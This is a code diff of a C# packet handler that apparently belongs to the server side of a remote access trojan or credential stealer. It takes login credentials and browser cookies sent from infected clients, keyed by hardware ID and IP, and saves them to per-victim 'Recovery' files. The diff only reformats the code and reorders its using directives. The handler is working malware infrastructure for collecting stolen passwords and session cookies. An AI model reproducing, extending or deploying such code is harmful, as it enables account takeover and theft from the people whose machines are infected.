@@ -1,13 +1,9 @@
-﻿using Server.MessagePack;
-using Server.Connection;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.Drawing;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
+using Server.Connection;
+using Server.MessagePack;
 
 namespace Server.Handle_Packet
 {
@@ -17,21 +13,27 @@ namespace Server.Handle_Packet
         {
             try
             {
-                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
-                string pass = unpack_msgpack.ForcePathObject("Logins").AsString;
-                string cookies = unpack_msgpack.ForcePathObject("Cookies").AsString;
+                var fullPath = Path.Combine(Application.StartupPath, "ClientsFolder",
+                    unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
+                var pass = unpack_msgpack.ForcePathObject("Logins").AsString;
+                var cookies = unpack_msgpack.ForcePathObject("Cookies").AsString;
                 if (!string.IsNullOrWhiteSpace(pass) || !string.IsNullOrWhiteSpace(cookies))
                 {
                     if (!Directory.Exists(fullPath))
                         Directory.CreateDirectory(fullPath);
-                    File.WriteAllText(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", pass.Replace("\n", Environment.NewLine));
-                    File.WriteAllText(fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", cookies);
-                    new HandleLogs().Addmsg($"Client {client.Ip} password recoveried success，file located @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Recovery", Color.Purple);
+                    File.WriteAllText(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt",
+                        pass.Replace("\n", Environment.NewLine));
+                    File.WriteAllText(fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt",
+                        cookies);
+                    new HandleLogs().Addmsg(
+                        $"Client {client.Ip} password recoveried success，file located @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Recovery",
+                        Color.Purple);
                 }
                 else
                 {
                     new HandleLogs().Addmsg($"Client {client.Ip} password recoveried error", Color.MediumPurple);
                 }
+
                 client?.Disconnected();
             }
             catch (Exception ex)
